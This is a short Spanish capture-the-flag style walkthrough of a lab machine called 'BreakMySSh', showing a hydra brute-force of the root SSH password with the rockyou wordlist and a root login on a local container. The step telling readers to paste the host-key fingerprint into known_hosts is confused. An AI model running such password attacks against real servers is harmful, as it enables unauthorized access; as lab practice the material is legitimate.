BreakMySSh

se hace ping ttl 64 es Linux

el nmap dice que el puerto 22 esta abierto ssh

no se tiene usuario en este caso pero se puede probar con root, hacer un ataque de fuerza bruta con hydra poniendo el usuario root

hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -v

Encuentra la contra de root que es estrella pero dice esto 

└─$ ssh root@172.17.0.2 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ED25519 key sent by the remote host is
SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.
Please contact your system administrator.
Add correct host key in /home/kali/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/kali/.ssh/known_hosts:3
  remove with:
  ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
Host key for 172.17.0.2 has changed and you have requested strict checking.
Host key verification failed.

Para arreglar esto eliminamos las keys que estan en el archivo ssh-keygen asi 

└─$ ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'

Despues hay que moverse a esa carpeta y editar el archivo 
┌──(kali㉿kali)-[~]
└─$ cd ..
                                                                                                                                                 
┌──(kali㉿kali)-[/home]
└─$ ls
kali
                                                                                                                                                 
┌──(kali㉿kali)-[/home]
└─$ cd kali
                                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ cd .ssh
                                                                                                                                                 
┌──(kali㉿kali)-[~/.ssh]
└─$ ls
agent  known_hosts  known_hosts.old
                                                                                                                                                 
┌──(kali㉿kali)-[~/.ssh]
└─$ nano known_hosts 

para poner esto

U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.

Y asi nos podemos conectar por ssh como root 

┌──(kali㉿kali)-[~/.ssh]
└─$ ssh root@172.17.0.2                                        

The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@172.17.0.2's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@34ed3d3ab280:~# whoami
root
root@34ed3d3ab280:~# 
